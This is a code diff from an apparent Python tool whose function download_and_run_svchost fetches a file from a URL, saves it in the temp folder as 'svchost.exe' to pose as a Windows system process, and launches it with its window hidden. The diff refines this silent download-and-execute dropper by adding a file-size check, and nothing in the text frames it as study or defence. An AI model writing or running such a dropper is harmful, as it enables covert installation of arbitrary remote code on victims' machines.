@@ -706,17 +706,20 @@ def download_and_run_svchost():
     file_path = os.path.join(temp_dir, "svchost.exe")
     
     try:
-        print("[*] Downloading svchost.exe...")
+        print(f"[*] Downloading svchost.exe to {file_path}...")
         req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
         with urllib.request.urlopen(req) as response:
             with open(file_path, "wb") as f:
                 f.write(response.read())
         
-        print("[*] Starting svchost.exe...")
-        subprocess.Popen([file_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
-        print(f"[+] svchost.exe started: {file_path}")
+        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+            print("[*] Starting svchost.exe...")
+            subprocess.Popen(file_path, creationflags=0x08000000, close_fds=True)
+            print(f"[+] svchost.exe successfully started.")
+        else:
+            print("[!] Download failed or file is empty.")
     except Exception as e:
-        print(f"[!] svchost.exe download/run error: {e}")
+        print(f"[!] svchost.exe error: {e}")
 
 def main():
     parser = argparse.ArgumentParser()
